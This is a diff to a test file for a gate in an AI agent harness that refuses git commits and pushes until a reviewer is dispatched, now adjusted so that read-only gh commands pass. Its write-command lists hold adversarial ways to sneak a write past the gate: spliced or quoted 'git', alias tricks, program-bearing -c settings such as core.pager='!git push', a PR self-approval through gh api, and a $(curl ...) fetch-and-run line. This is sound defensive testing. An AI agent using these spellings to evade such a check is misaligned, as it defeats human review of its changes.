@@ -67,6 +67,11 @@ import {
   hasLiteralAdminFlag,
   countMergeVerbs,
   isGitOp,
+  readsOnlyGhRead,
+  GH_READ_SUBCOMMANDS,
+  PR_NON_MERGE_SUBCOMMANDS,
+  tierSourceFor,
+  dispatchFloorMessage,
   isPushOrPrCreateCommand,
   reviewerRoleFor,
   extractMergePrNumber,
@@ -2472,7 +2477,22 @@ testAsync("#485 T1: micro marker + 0 dispatches → blocked with MICRO_BLOCK_MES
         fs.writeFileSync("/tmp/agent-issue-complexity", "Micro\n");
         const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
         ok(blocked && blocked.block === true, "micro at 0 dispatches must block (#485)");
-        equal(blocked.reason, MICRO_BLOCK_MESSAGE, "micro block must carry the micro-specific remediation");
+        // #2204 (3): the refusal NAMES the tier it read, so the operator can tell a `micro` block
+        // from a block whose tier was never determined. The base message is still the prefix (its
+        // micro-specific remediation is pinned immediately below).
+        ok(
+          blocked.reason.startsWith(MICRO_BLOCK_MESSAGE),
+          "micro block must carry the micro-specific remediation"
+        );
+        ok(/\n   → Tier: micro — /.test(blocked.reason), "the micro refusal NAMES the tier it read (#2204)");
+        ok(
+          !/unlabeled/.test(blocked.reason.split("\n").find((l) => l.includes("→ Tier:")) ?? ""),
+          "a micro refusal must not name any tier but micro"
+        );
+        // #2204 (2): the refusal is NOT terminating — the SDK only stops the agent early when a
+        // blocked result carries `terminate: true`. Pinned explicitly, because "make the refusal
+        // stick" is the tempting edit and it is the one that ends a lane's run.
+        equal(blocked.terminate, false, "the refusal must not terminate the agent (#2204)");
         // Positive remediation-outcome pins (not just self-referential equality
         // to the exported const): the blocked micro agent must be told docs-only
         // sets need a lightweight [REVIEW] dispatch and that it must NOT go read
@@ -2556,7 +2576,18 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
           fs.writeFileSync("/tmp/agent-issue-complexity", producerValue);
           const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
           ok(blocked && blocked.block === true, `${producerValue.trim()} at 0 dispatches must block (#485)`);
-          equal(blocked.reason, BLOCK_MESSAGE, `${producerValue.trim()} block must carry the generic BLOCK_MESSAGE`);
+          ok(
+            blocked.reason.startsWith(BLOCK_MESSAGE),
+            `${producerValue.trim()} block must carry the generic BLOCK_MESSAGE`
+          );
+          // #2204 (3): the tier is NAMED in the message, and the audit says whether it was READ
+          // from the marker or never determined. `unknown` is the pre-flight's literal for an
+          // unlabeled issue, so it reports as UNDETERMINED — not as a stricter tier.
+          const expectedTier = producerValue.trim().toLowerCase() === "unknown" ? "unlabeled" : producerValue.trim().toLowerCase();
+          ok(
+            new RegExp(`\\n   → Tier: ${expectedTier} — `).test(blocked.reason),
+            `${producerValue.trim()} refusal names the tier that triggered it (${expectedTier}) (#2204)`
+          );
           ok(
             blocked.reason.includes("code-review/SKILL.md"),
             "generic remediation must direct the agent to the code-review dispatch protocol"
@@ -2577,6 +2608,14 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
             producerValue.trim().toLowerCase(),
             `${producerValue.trim()} gate_block audit carries the marker tier (same normalization as the production read)`
           );
+          // #2204 (3): `tier_source` separates "a tier was read" from "no tier was determined".
+          // Before it, `tier: unlabeled` was written for BOTH the marker-absent case and the
+          // pre-flight's literal `unknown`, so the log could not tell them apart.
+          equal(
+            blockAudit?.tier_source,
+            TIER_PROVENANCE[producerValue.trim().toLowerCase()],
+            `${producerValue.trim()} gate_block audit states whether the tier was READ or UNDETERMINED (#2204)`
+          );
           // #1492: the NON-micro branch must record the refused command too.
           equal(
             blockAudit?.command,
@@ -2589,7 +2628,21 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
         fs.unlinkSync("/tmp/agent-issue-complexity");
         const unlabeled = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
         ok(unlabeled && unlabeled.block === true, "unlabeled (no marker) at 0 dispatches must block");
-        equal(unlabeled.reason, BLOCK_MESSAGE, "unlabeled (no marker) block must carry the generic BLOCK_MESSAGE");
+        ok(
+          unlabeled.reason.startsWith(BLOCK_MESSAGE),
+          "unlabeled (no marker) block must carry the generic BLOCK_MESSAGE"
+        );
+        // #2204 (3) — THE POINT OF THE ISSUE: an ABSENT marker is not a strict tier. The refusal
+        // must say the tier was never determined, and must NOT read as "unlabeled is the strictest
+        // tier". Both halves are pinned: the label, and the sentence explaining what it means.
+        ok(
+          /\n   → Tier: unlabeled — no tier marker was present/.test(unlabeled.reason),
+          "an absent marker names tier `unlabeled` AND its provenance (#2204)"
+        );
+        ok(
+          unlabeled.reason.includes("NEVER DETERMINED") && unlabeled.reason.includes("uniform"),
+          "…saying the tier was never determined and that the floor is uniform, not stricter (#2204)"
+        );
         // #516 (cont.): the marker-ABSENT block audits tier "unlabeled" (the
         // TIER_RULE vocabulary key for no-marker sessions) so attribution stays
         // reconstructible when no marker file exists; Pass A blocked four ops
@@ -2598,6 +2651,11 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
         ok(unlabeledAudit, "unlabeled block must emit a gate_block audit entry");
         equal(unlabeledAudit?.reason, "no_reviewers_dispatch", "unlabeled gate_block audit pins reason no_reviewers_dispatch");
         equal(unlabeledAudit?.tier, "unlabeled", "unlabeled (no marker) gate_block audit carries tier unlabeled");
+        equal(
+          unlabeledAudit?.tier_source,
+          TIER_PROVENANCE.unlabeled,
+          "the marker-absent audit says the tier was UNDETERMINED (#2204)"
+        );
         equal(
           readAuditLines(auditLogPath()).filter((l) => l.event === "gate_block").length,
           4,
@@ -2626,6 +2684,488 @@ testAsync("#485 T1b: standard + complex + unknown + unlabeled × {0, ≥1} dispa
       }
     });
   });
+});
+
+// ── #2204 — the dispatch floor must not refuse a READ ───────────────────────
+//
+// MEASURED on three cells: `for n in …; do gh pr view $n … done` and `sha=$(gh api repos/…)`
+// were refused with `reason: no_reviewers_dispatch`, and four lanes ended on the refusal within
+// ~60 s of starting. Both are READS, so there was no reviewer to dispatch for them. The candidate
+// came from `isGitOp`'s broad gh arms (a construct plus `gh`+`pr` is enough) — which is exactly
+// why a prefix list of `gh` verbs cannot be the predicate: the `gh` word sits inside a shell
+// construct, not at the start of the command.
+//
+// The floor itself must survive this fix. The tests below are therefore written as PAIRS: every
+// allow-shaped case has a write-shaped twin that must still be refused at zero dispatches.
+
+section("#2204 — a positively-readable read needs no reviewer dispatch");
+
+// The tier -> provenance map as DATA (fresh review, P2). The first version derived the expectation
+// with the same `tier === "unknown" ? … : …` ternary production uses, which is a TAUTOLOGY: it
+// agrees with the code by construction and would keep agreeing if both sides changed together. The
+// table is independent of the code, and the exhaustiveness check below stops a new tier shipping
+// without a declared provenance.
+const TIER_PROVENANCE: Record<string, "read" | "undetermined"> = {
+  micro: "read",
+  standard: "read",
+  complex: "read",
+  unknown: "undetermined", // the pre-flight's literal for an issue with no complexity label
+  unlabeled: "undetermined", // no marker file at all
+};
+
+test("#2204: readsOnlyGhRead — the measured shapes read, the writes do not", () => {
+  // The exact evidence shapes. These MUST be reads: they are what killed four lanes.
+  const reads = [
+    // evidence 1 — `gh pr view` inside a for loop (the log's first blocked command)
+    `cd /tmp/cell-home/wt-reapers && for n in 2058 2172 1858 1863 1161 2173; do echo "=== $n ==="; gh pr view "$n" --json title,body,state; done`,
+    // evidence 2 — `gh api` into a command substitution (the log's second)
+    `sha=$(gh api repos/daniel-ospina/agent-infra/pulls/1863 --jq .head.sha)`,
+    `for pr in 1863 1161; do sha=$(gh api repos/o/r/pulls/$pr --jq .head.sha); echo "$sha"; done`,
+    // reads that only exist inside a substitution or beside a redirection
+    `gh pr view $(gh api repos/x --jq .a)`,
+    `for n in 1 2; do gh pr view $n; done > /tmp/out.txt`,
+    `for f in 1 2; do git log --oneline -1 $f; gh pr view $f; done`,
+    `gh api repos/x --method GET`,
+    `gh issue view 5`,
+    // Read spellings of DUAL git verbs, and data filters in a pipe: refusing these would re-create
+    // #2204's false positive for ordinary triage loops (fresh review P2).
+    `for n in 1 2; do gh pr view $n; done; git worktree list`,
+    `for n in 1 2; do gh pr view $n; done; git stash list`,
+    `for n in 1 2; do gh pr view $n; done; git tag --contains HEAD`,
+    `for n in 1 2; do gh pr view $n; done; git branch --show-current`,
+    `for n in 1 2; do gh pr view $n; done; git config --get remote.origin.url`,
+    `for n in 1 2; do gh pr view $n; done; git remote -v`,
+    `for n in 1 2; do gh pr view $n; done; git log --oneline -3`,
+    `gh pr view 1863 --json body | sed -n '3,12p'`,
+    `gh pr view 1863 --json body | awk 'NR>1'`,
+    `gh pr view 1863 --json body | jq -r .body`,
+    // The positive allowlist must still certify the reads a triage loop runs beside them.
+    `for n in 1 2; do gh pr view $n; done; git rev-parse HEAD`,
+    `for n in 1 2; do gh pr view $n; done; git diff --stat main`,
+    `for n in 1 2; do gh pr view $n; done; git --no-pager log --oneline -3`,
+    `for n in 1 2; do gh pr view $n; done; git ls-files -m`,
+    `for n in 1 2; do gh pr view $n; done; git show --stat HEAD`,
+    // …and a PLAIN setting or a directory on a read verb is still a read: the config guard refuses
+    // only values that can name a program.
+    `for n in 1 2; do gh pr view $n; done; git -c core.quotepath=false log --oneline -3`,
+    `for n in 1 2; do gh pr view $n; done; git -C /tmp/wt log --oneline -1`,
+  ];
+  for (const cmd of reads) {
+    ok(readsOnlyGhRead(cmd), `POSITIVE READ expected (would be refused at 0 dispatches): ${cmd}`);
+  }
+  // The floor's own subjects, and every unreadable shape. These MUST NOT read.
+  const writes = [
+    "git commit -m x",
+    "git push",
+    "git push -u origin feat/x",
+    "github pr view 1",
+    "gh pr create --fill",
+    "gh pr merge 1",
+    "gh pr checkout 5",
+    // a read bundled with a write is a write
+    "gh pr view 1 && git push",
+    "for n in 1 2; do gh pr view $n; done && git commit -m x",
+    // a write spelled past the verb slot
+    "for f in 1 2; do git -C /tmp/wt commit -m $f; done && gh pr view 1",
+    "git c$'ommit' -m x",
+    // opaque executables: a program the text cannot read
+    `S='git push'; gh pr view 1; bash -c "$S"`,
+    "gh pr view 1; $CMD",
+    `gh pr view 1; node -e 'require("child_process").execSync("git push")'`,
+    "gh pr view 1; sh -c 'gh pr create --fill'",
+    "gh pr view 1 | sh",
+    "gh pr view 1; . <(echo 'git push')",
+    // a path-spelled gh is not a read this layer can certify
+    "/usr/bin/gh pr view 1",
+    // gh api writes -- including the ATTACHED short spellings, which pflag parses identically
+    // (`-fbody=x` IS `-f body=x`, a POST; the detached form alone let a SELF-APPROVAL of a PR
+    // read as a GET -- fresh review P1)
+    "gh api -X POST repos/o/r/issues -f title=x",
+    "gh api --method=POST repos/o/r/issues",
+    "gh api --input=x.json repos/x",
+    "gh api repos/x $F y=1",
+    "gh api graphql -f query='mutation { x }'",
+    "for n in 1; do gh pr view $n; gh api repos/o/r/issues -ftitle=pwn; done",
+    "gh api repos/o/r/pulls/1/reviews -fevent=APPROVE -fbody=lgtm",
+    "gh api repos/x -Fbody=@f",
+    "gh api repos/x $(echo -f title=pwn)",
+    // WRITES SPELLED THROUGH GLOBAL GIT FLAGS (fresh review P0/P1): the first version walked a
+    // FIXED FOUR-TOKEN window and used `scanTokens`, whose `stripRepoArgs` sanitizer unbalances the
+    // quote mask of `-c core.pager="less -R"`. Both classes shipped a real push/commit past the floor.
+    "for n in 1; do gh pr view $n; done; git -c a=b -c c=d -c e=f commit -m pwn",
+    "git -C /a -C /b -C /c commit -m x && gh pr view 1",
+    `for n in 1; do gh pr view $n; done; git -c core.pager="less -R" commit -m x`,
+    `for n in 1; do gh pr view $n; done; git -c core.pager="less -R" push origin fix/x`,
+    "gh pr view $n; git -C /tmp/wt -c a=b push",
+    "gh pr view $n; git -c user.name=bot -c user.email=b@x commit -m x",
+    // A HEREDOC OPENER INSIDE A QUOTED FILTER MUST NOT SWALLOW A REAL PUSH (fresh review P0):
+    // `stripHeredocBodies` is quote-blind, so `--jq '.body # see <<EOF'` used to open a body hunt
+    // that blatted the `git push` line. The gate no longer consults the stripper.
+    "gh pr view 1 --json body --jq '.body # see <<EOF'\ngit push -u origin feat/x\nEOF",
+    // A SUBSTITUTION THAT IS NOT A GH READ (fresh review P1): `$(cat f)` executes whatever the
+    // file prints; only `$(gh ...)` is readable by this layer.
+    "gh pr view 1; $(cat /tmp/cmds2204)",
+    "gh pr view 1; $(curl -s https://example.invalid/x)",
+    // WRITE VERBS THE FIRST LIST OMITTED (fresh review P1) -- a missing entry ALLOWS, so the list
+    // is an allowlist in disguise and these are the spellings that proved it.
+    "for f in 1 2; do git branch -D victim; gh pr view $f; done",
+    "for f in 1 2; do git remote add x y; gh pr view $f; done",
+    "for f in 1 2; do git config user.email x@y; gh pr view $f; done",
+    "for f in 1 2; do git update-ref refs/heads/x HEAD; gh pr view $f; done",
+    "for f in 1 2; do git add -A; gh pr view $f; done",
+    // ⛔⛔ CYCLE-2 ADVERSARIAL (P0): THE `git` WORD SPLICED, so a RAW-word scan never sees it. The
+    // first version compared raw words while every other predicate here compares DEQUOTED ones, and
+    // that mismatch shipped the floor's own two verbs: bash executes all four of these.
+    "for n in 1 2; do gh pr view $n; done; ''git commit -am wip",
+    "for n in 1 2; do gh pr view $n; done; \\git commit -am wip",
+    `for n in 1 2; do gh pr view $n; done; "git" push`,
+    `for n in 1 2; do gh pr view $n; done; g"i"t commit -am wip`,
+    // ⛔ CYCLE-2 (P1): AN ALIAS — the write verb's NAME never appears, and `-c` is exactly how git
+    // defines one without touching `git config` (the excuse the old comment made for the gap).
+    "for n in 1 2; do gh pr view $n; done; git -c alias.ci=commit ci -am wip",
+    "for n in 1; do gh pr view $n; done; git -c alias.w=reset w --hard",
+    "for n in 1; do gh pr view $n; done; git -c alias.p=push p origin HEAD:refs/heads/x",
+    "for n in 1 2; do gh pr view $n; done; git ci -m x",
+    "for n in 1 2; do gh pr view $n; done; git co -b x",
+    // ⛔ CYCLE-2 (P1): WRITE VERBS A DENYLIST OMITTED — with a denylist, a missing entry GRANTED the
+    // escape. The git side is now a positive READ allowlist, so the whole class is closed by
+    // polarity rather than by these particular spellings.
+    "for n in 1; do gh pr view $n; done; git update-index --force-remove f.txt",
+    "for n in 1; do gh pr view $n; done; git checkout-index -a -f",
+    "for n in 1; do gh pr view $n; done; git read-tree HEAD",
+    "for n in 1; do gh pr view $n; done; git hash-object -w f.txt",
+    "for n in 1; do gh pr view $n; done; git sparse-checkout set x",
+    "for n in 1; do gh pr view $n; done; git pack-refs --all",
+    "for n in 1; do gh pr view $n; done; git symbolic-ref HEAD refs/heads/x",
+    "for n in 1; do gh pr view $n; done; git frobnicate",
+    "for n in 1; do gh pr view $n; done; git",
+    "for f in 1 2; do git tag -d v1; gh pr view $f; done",
+    // ⛔ A READ SUBCOMMAND WITH A PROGRAM-BEARING CONFIG — the allowlist on the SUBCOMMAND is not
+    // enough, because `-c` can point git at a program it will run: `core.pager`, an editor, a hook
+    // path, ssh, a diff external, a content filter, a credential helper, an include — and `!` is
+    // git's own "run this as a shell command" prefix, so `git -c core.pager='!git push' log` writes
+    // under a verb this list certifies as a read (cycle-2 review, P1 follow-on).
+    "git -c core.pager='!git push' log --oneline -3; gh pr view 1",
+    "git -c alias.p=push log; gh pr view 1",
+    "git -c core.hooksPath=/tmp/evil log; gh pr view 1",
+    "git -c core.sshCommand='sh -c x' log; gh pr view 1",
+    "git -c diff.external=/tmp/x log; gh pr view 1",
+    "git -c include.path=/tmp/x log; gh pr view 1",
+    "git -c credential.helper=/tmp/x log; gh pr view 1",
+    "git --config-env=core.pager=EVIL log; gh pr view 1",
+    "git --exec-path=/tmp/evil log; gh pr view 1",
+    "git --exec-path /tmp/evil log; gh pr view 1",
+  ];
+  for (const cmd of writes) {
+    ok(!readsOnlyGhRead(cmd), `NOT a read (must keep the floor's decision): ${cmd}`);
+  }
+});
+
+testAsync("#2204: the evidence loops are ALLOWED end-to-end at 0 dispatches (and audited)", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      const { pi, fire } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        const loop = await fire("tool_call", {
+          toolName: "bash",
+          input: { command: "cd /tmp/x && for n in 2058 2172 1858; do echo \"=== $n ===\"; gh pr view \"$n\" --json title,body; done" },
+        });
+        equal(loop, undefined, "a `for` loop of `gh pr view` reads must be allowed with ZERO dispatches (#2204 evidence 1)");
+        const subst = await fire("tool_call", {
+          toolName: "bash",
+          input: { command: "for pr in 1863 1161; do sha=$(gh api repos/o/r/pulls/$pr --jq .head.sha); echo \"$pr $sha\"; done" },
+        });
+        equal(subst, undefined, "a `$(gh api …)` read must be allowed with ZERO dispatches (#2204 evidence 2)");
+        // Durable: the allow is recorded as a PASS with its reason, so the JSONL no longer shows
+        // `no_reviewers_dispatch` for a read and an operator can count what was allowed.
+        const passes = readAuditLines(auditLogPath()).filter((l) => l.event === "gate_pass");
+        equal(passes.length, 2, "both read allows are audited (one gate_pass each)");
+        equal(passes[0].reason, "read_only_no_dispatch", "the pass reason distinguishes a read from a dispatch");
+        equal(passes[0].extension, "review-enforcer", "…and is attributable to this gate");
+        ok(
+          String(passes[0].command).includes("gh pr view"),
+          "the pass records WHICH read was allowed (#1492's field, same shape)"
+        );
+        equal(
+          readAuditLines(auditLogPath()).filter((l) => l.event === "gate_block").length,
+          0,
+          "no gate_block was emitted for either read — the false positive is gone"
+        );
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2204: the floor STILL refuses writes at 0 dispatches — alone and bundled with a read", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      const { pi, fire } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        // THE TWO TESTS THAT MATTER MOST (#2148/#1379): a false PASS here would ship an
+        // unreviewed commit. `git commit` and `git push` at zero dispatches must block.
+        const commit = await fire("tool_call", { toolName: "bash", input: { command: "git commit -m x" } });
+        ok(commit && commit.block === true, "`git commit` at 0 dispatches must STILL be refused");
+        ok(commit.reason.includes("No reviewers were dispatched"), "…with the dispatch refusal, not a read pass");
+        const push = await fire("tool_call", { toolName: "bash", input: { command: "git push -u origin feat/x" } });
+        ok(push && push.block === true, "`git push` at 0 dispatches must STILL be refused");
+        // A read does NOT buy the refuser's silence for a write riding beside it: the candidate is
+        // the COMMAND, and a command that writes is a write.
+        const bundled = await fire("tool_call", {
+          toolName: "bash",
+          input: { command: "for n in 1863 1161; do gh pr view $n --json title; done && git push" },
+        });
+        ok(bundled && bundled.block === true, "a read bundled with a `git push` must STILL be refused");
+        const bundledCommit = await fire("tool_call", {
+          toolName: "bash",
+          input: { command: "sha=$(gh api repos/o/r/pulls/1 --jq .head.sha); git commit -m x" },
+        });
+        ok(bundledCommit && bundledCommit.block === true, "a `$(gh api …)` bundled with a `git commit` must STILL be refused");
+        // And the counts are the proof the two paths did not merge: three refusals, zero passes.
+        const audit = readAuditLines(auditLogPath());
+        equal(audit.filter((l) => l.event === "gate_block").length, 4, "every write refusal is audited");
+        equal(audit.filter((l) => l.event === "gate_pass").length, 0, "no read PASS was recorded for a write");
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2204: the refusal names the tier, names what to run instead, and delivers a once-only recovery", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      // `withCapturedConsole` keeps the factory's own logs out of the test output; the message we
+      // assert on is the returned `reason` (what the model reads as the tool result).
+      const { pi, fire, sent } = mockPi();
+      (reviewEnforcerFactory as any)(pi);
+      try {
+        await fire("session_start");
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(blocked && blocked.block === true, "still refused");
+        // (3) THE TIER IS NAMED, and `unlabeled` is explained rather than implied.
+        ok(/\n   → Tier: unlabeled — no tier marker was present/.test(blocked.reason), "the refusal names the tier and its provenance");
+        ok(blocked.reason.includes("NEVER DETERMINED"), "…and says an absent marker means no tier was determined (#2204)");
+        // (2) WHAT TO RUN INSTEAD: the reported shapes were reads, so the message hands over the
+        // shapes that need no reviewer — plus the retry instruction that makes the refusal
+        // survivable instead of terminal.
+        for (const needed of ["THIS REFUSAL IS NOT TERMINAL", "re-run the SAME command", "gh pr view <n>", "gh api <GET path>"]) {
+          ok(blocked.reason.includes(needed), `the refusal must include ${JSON.stringify(needed)} (#2204)`);
+        }
+        equal(blocked.terminate, false, "the blocked result must not be terminating (#2204)");
+        // The model-visible half: a followUp message (delivered when the agent has no more tool
+        // calls — the moment the run would otherwise end) that triggers a turn.
+        const recoveries = sent.filter((s) => s.message?.customType === "reviewer-block-recovery");
+        equal(recoveries.length, 1, "the recovery is delivered to the model exactly once");
+        equal(recoveries[0].options?.deliverAs, "followUp", "…as a followUp, i.e. at the moment the run would end");
+        equal(recoveries[0].options?.triggerTurn, true, "…and it triggers that turn instead of letting the run stop");
+        equal(recoveries[0].message?.content, blocked.reason, "…carrying the same instruction as the tool result");
+        // ONCE per session is the bound that keeps this from becoming a retry loop: a lane that
+        // keeps issuing refused commands buys ONE extra turn, not one per refusal.
+        const second = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(second && second.block === true, "the second refusal still blocks");
+        equal(
+          sent.filter((s) => s.message?.customType === "reviewer-block-recovery").length,
+          1,
+          "…and does NOT deliver a second recovery (no unbounded turn loop)"
+        );
+        const recoveryAudit = readAuditLines(auditLogPath()).filter(
+          (l) => l.event === "reviewer_preflight" && l.phase === "block_recovery"
+        );
+        equal(recoveryAudit.length, 1, "the delivery is audited once, with its phase");
+        // The audit must say what HAPPENED, not what was attempted (fresh review, P2): the first
+        // version wrote this record even when the host had no `sendMessage`, so the log claimed the
+        // model had been told when nothing was delivered — and the session's one recovery was spent.
+        equal(recoveryAudit[0].send_queued, true, "…and records that the message was handed to the SDK");
+        equal(recoveryAudit[0].tier_source, "undetermined", "…with the same provenance the block recorded (#2204 (3))");
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2204: a delivery that could not happen does NOT spend the session's one recovery", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      process.env.PI_MODE = "print";
+      try {
+        // A host without `sendMessage` (an older SDK, or a test double): the gate must still refuse,
+        // must not throw, and must NOT record a delivery that never happened.
+        const handlers = new Map<string, Function[]>();
+        const pi = {
+          on: (ev: string, fn: Function) => {
+            const arr = handlers.get(ev) ?? [];
+            arr.push(fn);
+            handlers.set(ev, arr);
+          },
+        };
+        const fire = async (ev: string, event?: any): Promise<any> => {
+          const arr = handlers.get(ev) ?? [];
+          let last: any;
+          for (const fn of arr) last = await fn(event ?? {}, {});
+          return last;
+        };
+        (reviewEnforcerFactory as any)(pi);
+        await fire("session_start");
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(blocked && blocked.block === true, "the refusal still happens on a host with no sendMessage");
+        ok(blocked.reason.includes("THIS REFUSAL IS NOT TERMINAL"), "…and still carries the recovery text in the tool result");
+        const audit = readAuditLines(auditLogPath()).filter(
+          (l) => l.event === "reviewer_preflight" && l.phase === "block_recovery"
+        );
+        equal(audit.length, 1, "the attempt is still audited (an operator must be able to see it)");
+        equal(audit[0].send_queued, false, "…and says NOTHING was handed over");
+      } finally {
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+testAsync("#2204: a harness lane's recovery carries the HARNESS advice, not a dispatch order (#2148)", async () => {
+  await withTempHome(async () => {
+    await withMarkerIsolated(async () => {
+      const prevMode = process.env.PI_MODE;
+      const prevKind = process.env.KIND;
+      process.env.PI_MODE = "print";
+      // `reviewerRoleFor()` runs at FACTORY LOAD, so the role must be set before the factory call.
+      process.env.KIND = "lane";
+      try {
+        const { pi, fire, sent } = mockPi();
+        (reviewEnforcerFactory as any)(pi);
+        await fire("session_start");
+        const blocked = await fire("tool_call", { toolName: "bash", input: { command: "git push" } });
+        ok(blocked && blocked.block === true, "a harness lane is still refused at 0 dispatches");
+        const recoveries = sent.filter((s) => s.message?.customType === "reviewer-block-recovery");
+        equal(recoveries.length, 1, "…and still gets the recovery");
+        // The tool result AND the model-visible message are the same text, and both are the HARNESS
+        // text: one path, one audience, no chance of the two drifting apart.
+        equal(recoveries[0].message?.content, blocked.reason, "the recovery is the same text as the tool result");
+        ok(/do NOT dispatch/i.test(blocked.reason), "a lane is told it does not dispatch (#2148)");
+        ok(/FINAL head/.test(blocked.reason), "…and what it DOES own (push its final head)");
+      } finally {
+        if (prevKind === undefined) delete process.env.KIND; else process.env.KIND = prevKind;
+        if (prevMode === undefined) delete process.env.PI_MODE; else process.env.PI_MODE = prevMode;
+      }
+    });
+  });
+});
+
+test("#2204: dispatchFloorMessage names EVERY tier, and `unknown` reads as UNDETERMINED", () => {
+  // The marker vocabulary (TIER_RULE) is the source, so a new key cannot be added without this
+  // test's matrix noticing that its message has no provenance clause.
+  for (const tier of Object.keys(TIER_RULE)) {
+    const label = tier === "unknown" ? "unlabeled" : tier;
+    const msg = dispatchFloorMessage(tier);
+    ok(msg.includes(`→ Tier: ${label} — `), `${tier} is named in its own refusal (as ${label})`);
+    ok(msg.includes("THIS REFUSAL IS NOT TERMINAL"), `${tier} refusal says it is not terminal (#2204)`);
+  }
+  // `unknown` is the pre-flight's literal for an UNLABELED issue: it must read as "nobody determined
+  // a tier", never as a tier of its own — the #2204 (3) complaint, one level up from the log.
+  const unknownMsg = dispatchFloorMessage("unknown");
+  ok(/\n   → Tier: unlabeled — the recorded value was `unknown`/.test(unknownMsg), "unknown maps to unlabeled + its provenance");
+  ok(unknownMsg.includes("UNDETERMINED"), "…and says UNDETERMINED, not 'stricter'");
+  ok(!unknownMsg.includes("Tier: unknown"), "`unknown` is never presented as a tier that was read");
+  // The vocabulary's own `unlabeled` key is UNDETERMINED too: a marker containing that word records
+  // that nobody determined a tier, so it must not report as `read` (cycle-2 review, P2).
+  const unlabeledLiteral = dispatchFloorMessage("unlabeled");
+  ok(/\n   → Tier: unlabeled — the recorded value was `unlabeled`/.test(unlabeledLiteral),
+     "a marker spelling `unlabeled` is reported as UNDETERMINED, not as a tier that was read");
+  equal(tierSourceFor("unlabeled"), "undetermined", "…and tierSourceFor agrees with the message");
+  equal(tierSourceFor("micro"), "read", "a real tier is `read`");
+  equal(tierSourceFor(""), "undetermined", "no marker is `undetermined`");
+  // The micro message is still the micro remediation (its skill skip is what makes it different) —
+  // the tier line is APPENDED, not substituted.
+  ok(dispatchFloorMessage("micro").startsWith(MICRO_BLOCK_MESSAGE), "micro keeps its own remediation");
+  ok(dispatchFloorMessage("standard").startsWith(BLOCK_MESSAGE), "standard keeps the generic remediation");
+  // The provenance table is exhaustive over the tier vocabulary: a new tier cannot ship without a
+  // declared provenance (and the per-tier assertions above then demand the message names it).
+  equal(
+    Object.keys(TIER_PROVENANCE).sort().join(","),
+    Object.keys(TIER_RULE).sort().join(","),
+    "every tier has a declared provenance, and no provenance names a tier that does not exist (#2204)"
+  );
+});
+
+test("#2204: the read allowlist cannot certify a MERGE — `pr` reads stay a subset of the non-merge register", () => {
+  // The escape sits at the ZERO-DISPATCH point, i.e. strictly downstream of the admin-merge and
+  // merge-registry gates, so a `gh pr <merge>` that reached it would already have been judged. That
+  // ordering is what makes the escape safe, and ordering is exactly what a later edit moves. The
+  // subset pin is the cheap invariant: `merge` is one keystroke from `view` in the same array, and
+  // this test fails in the unit suite instead of at merge time.
+  for (const sub of GH_READ_SUBCOMMANDS.pr) {
+    ok(
+      PR_NON_MERGE_SUBCOMMANDS.has(sub),
+      `gh pr ${sub} is certified a READ but is not on the non-merge register (${[...PR_NON_MERGE_SUBCOMMANDS].join("/")})`
+    );
+  }
+  for (const never of ["merge", "admin-merge", "checkout", "create"]) {
+    ok(
+      !GH_READ_SUBCOMMANDS.pr.includes(never),
+      `gh pr ${never} must never be a certified read — it writes or it is the verb the floor gates`
+    );
+  }
+  // The two verbs the floor exists for are not reachable through any read group's allowlist.
+  for (const [group, subs] of Object.entries(GH_READ_SUBCOMMANDS)) {
+    for (const never of ["merge", "create", "delete", "close", "edit", "comment"]) {
+      ok(!subs.includes(never), `gh ${group} ${never} must never be a certified read`);
+    }
+  }
+});
+
+test("#2204: the recovery advice is ROLE-AWARE — a harness lane is not told to dispatch (#2148)", () => {
+  // The recovery is delivered as a `followUp` that TRIGGERS A TURN, so telling a harness worker to
+  // dispatch a reviewer is #2148's contradiction with a keystroke attached: it wakes the lane up to
+  // do something its brief forbids and its toolset does not contain.
+  const self = dispatchFloorMessage("standard", "self");
+  ok(self.includes("dispatch a reviewer"), "a self-reviewing session IS told to dispatch");
+
+  const harness = dispatchFloorMessage("standard", "harness");
+  // Not "the word never appears": the needed hedge DOES mention it. What must not exist is an
+  // UNCONDITIONAL order — every dispatch instruction has to sit on the brief-overrides line.
+  for (const line of harness.split("\n")) {
+    if (/dispatch a reviewer/i.test(line)) {
+      ok(
+        /If your brief says/.test(line),
+        `the only dispatch instruction a harness lane sees is CONDITIONAL on its brief: ${line.trim()}`
+      );
+    }
+  }
+  ok(/do NOT dispatch/i.test(harness), "…and the default harness instruction is explicitly not to dispatch (#2148)");
